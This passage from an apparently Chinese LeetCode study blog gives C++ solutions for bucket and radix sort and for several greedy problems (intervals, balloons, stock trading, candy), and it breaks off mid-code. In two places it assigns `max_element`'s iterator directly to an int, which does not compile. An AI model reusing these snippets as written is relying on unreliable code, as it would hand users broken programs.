<span class="hljs-type">int</span> maxVal = <span class="hljs-built_in">max_element</span>(arr.<span class="hljs-built_in">begin</span>(), arr.<span class="hljs-built_in">end</span>());<br><br>    <span class="hljs-comment">// 计算桶的数量</span><br>    <span class="hljs-type">int</span> bucketCount = (maxVal - minVal) / bucketSize + <span class="hljs-number">1</span>;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">buckets</span>(bucketCount);<br><br>    <span class="hljs-comment">// 将数组中的元素分配到相应的桶中</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        <span class="hljs-type">int</span> bucketIndex = (num - minVal) / bucketSize;<br>        buckets[bucketIndex].<span class="hljs-built_in">push_back</span>(num);<br>    &#125;<br><br>    <span class="hljs-comment">// 对每个桶中的元素进行排序</span><br>    <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; bucket : buckets) &#123;<br>        <span class="hljs-built_in">insertionSort</span>(bucket);<br>    &#125;<br><br>    <span class="hljs-comment">// 将所有桶中的元素合并到原数组中</span><br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; bucket : buckets) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : bucket) &#123;<br>            arr[index++] = num;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="基数排序">10. 基数排序</h1><blockquote><p>基数排序（RadixSort）是一种非比较排序算法，适用于对整数或字符串等数据进行排序。它通过逐位排序来实现，从最低位到最高位依次进行排序，最终得到一个有序的数组。基数排序通常分为<strong>LSD（LeastSignificant Digit）</strong>排序和<strong>MSD（Most SignificantDigit）</strong>排序，前者从最低有效位开始，后者从最高有效位开始。</p><p>基数排序的步骤：</p><ol type="1"><li><strong>确定最大位数</strong>：找出数组中最大的数字，根据该数字确定排序所需的最大位数。</li><li><strong>按位数进行排序</strong>：从最低位（个位）开始，对数组中的数字进行排序。可以使用计数排序或桶排序对每一位的数字进行排序。然后依次对更高的每一位进行排序，直到处理到最高位。</li><li><strong>合并结果</strong>：每一位的排序结果会逐渐逼近最终的排序结果，最后得到一个有序的数组。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 获取数组中最大值的位数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMaxDigits</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> </span>&#123;<br>    <span class="hljs-type">int</span> maxVal = <span class="hljs-built_in">max_element</span>(arr.<span class="hljs-built_in">begin</span>(), arr.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> digits = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (maxVal &gt; <span class="hljs-number">0</span>) &#123;<br>        digits++;<br>        maxVal /= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> digits;<br>&#125;<br><br><span class="hljs-comment">// 计数排序，按当前位进行排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">countingSortByDigit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> exp)</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = arr.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">output</span><span class="hljs-params">(n)</span></span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">count</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>)</span></span>;  <span class="hljs-comment">// 基数为10</span><br><br>    <span class="hljs-comment">// 统计出现次数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-type">int</span> digit = (arr[i] / exp) % <span class="hljs-number">10</span>;<br>        count[digit]++;<br>    &#125;<br><br>    <span class="hljs-comment">// 累加计数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        count[i] += count[i - <span class="hljs-number">1</span>];<br>    &#125;<br><br>    <span class="hljs-comment">// 根据当前位的数字排序</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-type">int</span> digit = (arr[i] / exp) % <span class="hljs-number">10</span>;<br>        output[count[digit] - <span class="hljs-number">1</span>] = arr[i];<br>        count[digit]--;<br>    &#125;<br><br>    <span class="hljs-comment">// 将排序结果复制回原数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        arr[i] = output[i];<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">radixSort</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> </span>&#123;<br>    <span class="hljs-comment">// 找到数组中最大值的位数</span><br>    <span class="hljs-type">int</span> maxDigits = <span class="hljs-built_in">getMaxDigits</span>(arr);<br><br>    <span class="hljs-comment">// 逐位进行计数排序</span><br>    <span class="hljs-type">int</span> exp = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 表示位数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; maxDigits; i++) &#123;<br>        <span class="hljs-built_in">countingSortByDigit</span>(arr, exp);<br>        exp *= <span class="hljs-number">10</span>;  <span class="hljs-comment">// 移到下一位</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>贪心篇</title>
    <link href="/2024/08/19/LeetCode/%E8%B4%AA%E5%BF%83%E7%AF%87/"/>
    <url>/2024/08/19/LeetCode/%E8%B4%AA%E5%BF%83%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="区间类">1. 区间类</h1><h2 id="无重叠区间">无重叠区间</h2><blockquote><p>按照右端点排好序的区间进行遍历，并且实时维护上一个选择区间的右端点right。如果当前遍历到的区间与上一个区间不重合，即<code>intervals[i][0] ≥right</code>，那么我们就可以贪心地选择这个区间，并将right 更新为 <code>intervals[i][0]</code> 。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">eraseOverlapIntervals</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(intervals.<span class="hljs-built_in">begin</span>(), intervals.<span class="hljs-built_in">end</span>(),<br>             [](<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; a, <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; b) &#123; <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>]; &#125;);<br><br>        <span class="hljs-type">int</span> n = intervals.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> right = intervals[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (intervals[i][<span class="hljs-number">0</span>] &gt;= right) &#123;<br>                count++;<br>                right = intervals[i][<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> n - count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="用最少数量的箭引爆气球">用最少数量的箭引爆气球</h2><blockquote><p>首先，将所有气球按照它们的右边界（<code>points[i][1]</code>）进行升序排序。这样可以确保每次都从右边界最靠左的气球开始处理，这样可以尽可能少地使用箭。选择第一个气球的右边界作为当前箭的射击位置（<code>pos = points[0][1]</code>），并且初始化所需的箭数为1（<code>ans = 1</code>），因为至少需要一支箭来射爆第一个气球。从第二个气球开始，逐个检查它的左边界（<code>points[i][0]</code>）是否大于当前的射击位置（<code>pos</code>）。如果是，则说明这个气球与前一个气球不重叠，需要一支新的箭来射爆。因此，箭的数量加1，并将当前的射击位置更新为这个气球的右边界。遍历完所有气球后，<code>ans</code>就是最少需要的箭数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMinArrowShots</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; points)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(points.<span class="hljs-built_in">begin</span>(), points.<span class="hljs-built_in">end</span>(),<br>             [](<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; a, <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; b) &#123; <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>]; &#125;);<br><br>        <span class="hljs-type">int</span> n = points.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> pos = points[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (points[i][<span class="hljs-number">0</span>] &gt; pos) &#123;<br>                ans++;<br>                pos = points[i][<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="划分字母区间">划分字母区间</h2><blockquote><p>由于同一个字母只能出现在同一个片段，显然同一个字母的第一次出现的下标位置和最后一次出现的下标位置必须出现在同一个片段。因此需要遍历字符串，得到每个字母最后一次出现的下标位置。在得到每个字母最后一次出现的下标位置之后，可以使用贪心的思想寻找每个片段可能的最小结束下标，因此可以保证每个片段的长度一定是符合要求的最短长度，如果取更短的片段，则一定会出现同一个字母出现在多个片段中的情况。由于每次取的片段都是符合要求的最短的片段，因此得到的片段数也是最多的。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">partitionLabels</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> last[<span class="hljs-number">26</span>];<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            last[s[i] - <span class="hljs-string">&#x27;a&#x27;</span>] = i;<br>        &#125;<br><br>        vector&lt;<span class="hljs-type">int</span>&gt; ans;<br>        <span class="hljs-type">int</span> start = <span class="hljs-number">0</span>, end = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            end = <span class="hljs-built_in">max</span>(end, last[s[i] - <span class="hljs-string">&#x27;a&#x27;</span>]);<br>            <span class="hljs-keyword">if</span> (i == end) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(end - start + <span class="hljs-number">1</span>);<br>                start = end + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最多可以参加的会议数目">最多可以参加的会议数目</h2><blockquote><p>贪心的策略是：在所有开始时间相同的会议中，我们尽量的去选择结束时间最小的会议，因为结束时间更大的会议的选择天数更多。将会议按照开始时间排序。使用一个最小堆来跟踪当前可以参加的会议（按结束时间排序）。从最早的开始日期开始，每一天都检查可以参加的会议，并从最小堆中选出最早结束的会议参加。每天检查时，移除那些已经不能参加的会议（结束时间早于当前天数）。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxEvents</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; events)</span> </span>&#123;<br>        <span class="hljs-comment">// 按照会议的开始时间排序</span><br>        <span class="hljs-built_in">sort</span>(events.<span class="hljs-built_in">begin</span>(), events.<span class="hljs-built_in">end</span>());<br>        <br>        priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; minHeap;<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, n = events.<span class="hljs-built_in">size</span>(), day = <span class="hljs-number">0</span>, attended = <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-keyword">while</span> (!minHeap.<span class="hljs-built_in">empty</span>() || i &lt; n) &#123;<br>            <span class="hljs-keyword">if</span> (minHeap.<span class="hljs-built_in">empty</span>()) &#123;<br>                day = events[i][<span class="hljs-number">0</span>];  <span class="hljs-comment">// 如果堆为空，跳到下一个会议的开始时间</span><br>            &#125;<br>            <br>            <span class="hljs-comment">// 把所有在这一天开始的会议加入到最小堆中</span><br>            <span class="hljs-keyword">while</span> (i &lt; n &amp;&amp; events[i][<span class="hljs-number">0</span>] == day) &#123;<br>                minHeap.<span class="hljs-built_in">push</span>(events[i][<span class="hljs-number">1</span>]);<br>                i++;<br>            &#125;<br>            <br>            <span class="hljs-comment">// 参加最早结束的会议</span><br>            minHeap.<span class="hljs-built_in">pop</span>();<br>            attended++;<br>            day++;<br>            <br>            <span class="hljs-comment">// 移除已经不能参加的会议</span><br>            <span class="hljs-keyword">while</span> (!minHeap.<span class="hljs-built_in">empty</span>() &amp;&amp; minHeap.<span class="hljs-built_in">top</span>() &lt; day) &#123;<br>                minHeap.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> attended;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="单调递增的数字">单调递增的数字</h2><blockquote><p>首先，将整数 <code>n</code> 转换为字符串<code>s</code>，以方便逐位处理每个数字。从左到右扫描字符串<code>s</code>，找到第一个不满足单调递增的位，即<code>s[index - 1] &gt; s[index]</code>的位置。一旦找到不满足单调递增的位，向左检查并减少该位的值，直到之前的所有数字仍然满足单调递增的条件。每当减少一位时，还需要将<code>index</code> 前移，继续检查是否需要进一步减少前面的位。然后将<code>index</code>之后的所有位都设置为'9'，以确保得到的数是最大的单调递增数。最后，将修改后的字符串转换回整数，并返回这个整数作为结果。特别地，如果整个数字<code>n</code> 本身已经是按位单调递增的，那么最大的数字即为<code>n</code>。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">monotoneIncreasingDigits</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        string s = <span class="hljs-built_in">to_string</span>(n);<br>        <span class="hljs-type">int</span> len = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">while</span> (index &lt; len &amp;&amp; s[index - <span class="hljs-number">1</span>] &lt;= s[index]) &#123;<br>            index++;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (index &lt; len) &#123;<br>            <span class="hljs-keyword">while</span> (index &gt; <span class="hljs-number">0</span> &amp;&amp; s[index - <span class="hljs-number">1</span>] &gt; s[index]) &#123;<br>                s[index<span class="hljs-number">-1</span>]--;<br>                index--;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (index = index + <span class="hljs-number">1</span>; index &lt; len; index++) &#123;<br>                s[index] = <span class="hljs-string">&#x27;9&#x27;</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">stoi</span>(s);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="峰谷类">2. 峰谷类</h1><h2 id="买卖股票的最佳时机-ii">买卖股票的最佳时机 II</h2><blockquote><p>采用了贪心思想，即在每一个价格上，如果有利润可以赚取（即价格上涨），就立即进行买卖操作（计算该段时间的利润）。由于股票交易不限制买卖次数，这种方法通过每次价格上升时的局部交易来累积总利润，最终计算出的就是最大可能的收益。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; prices.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            ans += <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, prices[i] - prices[i - <span class="hljs-number">1</span>]);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="买卖股票的最佳时机含手续费">买卖股票的最佳时机含手续费</h2><blockquote><p>将手续费放在买入时进行计算，就可以得到一种基于贪心的方法。用 buy表示在最大化收益的前提下，如果我们手上拥有一支股票，那么它的最低买入价格是多少。在初始时，buy的值为 prices[0] 加上手续费 fee。那么当我们遍历到第 i (i&gt;0)天时：</p><ul><li>如果当前的股票价格 prices[i] 加上手续费 fee 小于 buy，那么与其使用buy 的价格购买股票，我们不如以 prices[i]+fee 的价格购买股票，因此我们将buy 更新为 prices[i]+fee；</li><li>如果当前的股票价格 prices[i] 大于 buy，那么我们直接卖出股票并且获得prices[i]−buy的收益。但实际上，我们此时卖出股票可能并不是全局最优的（例如下一天股票价格继续上升），因此我们可以提供一个反悔操作，看成当前手上拥有一支买入价格为prices[i] 的股票，将 buy 更新为prices[i]。这样一来，如果下一天股票价格继续上升，我们会获得prices[i+1]−prices[i] 的收益，加上这一天 prices[i]−buy的收益，恰好就等于在这一天不进行任何操作，而在下一天卖出股票的收益；</li><li>对于其余的情况，prices[i] 落在区间 [buy−fee,buy]内，它的价格没有低到我们放弃手上的股票去选择它，也没有高到我们可以通过卖出获得收益，因此我们不进行任何操作。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices, <span class="hljs-type">int</span> fee)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> buy = prices[<span class="hljs-number">0</span>] + fee;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; prices.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (prices[i] + fee &lt; buy) &#123;<br>                buy = prices[i] + fee;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prices[i] &gt; buy) &#123;<br>                ans += prices[i] - buy;<br>                buy = prices[i];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="摆动序列">摆动序列</h2><blockquote><p>只要当前元素与前一个元素的差值方向发生了变化，就增加摆动子序列的长度。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wiggleMaxLength</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (nums.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> last = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> now;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] == nums[i - <span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            now = (nums[i] - nums[i - <span class="hljs-number">1</span>]) &gt; <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">if</span> (now != last) &#123;<br>                ans++;<br>            &#125;<br>            last = now;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans + <span class="hljs-number">1</span>;<span class="hljs-comment">//变化折线数+1，即为节点数</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="分发糖果">分发糖果</h2><blockquote><p>把题目条件比相邻两边大拆分成比左边大和比右边大。先从前向后遍历，使得右边比左边评分更高的得到的糖果数比左边多一个。再从后向前遍历，使得左边比右边评分更高的得到的糖果数比右边多一个，这样两个条件就都满足了。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">candy</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; ratings)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = ratings.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">left</span><span class="hljs-params">(n, <span class="hljs-number">1</span>)</span></span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (ratings[i] &gt; ratings[i - <span class="hljs-number">1</span>]) &#123;<br>                left[i] = left[i - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> ans = left[n - <span 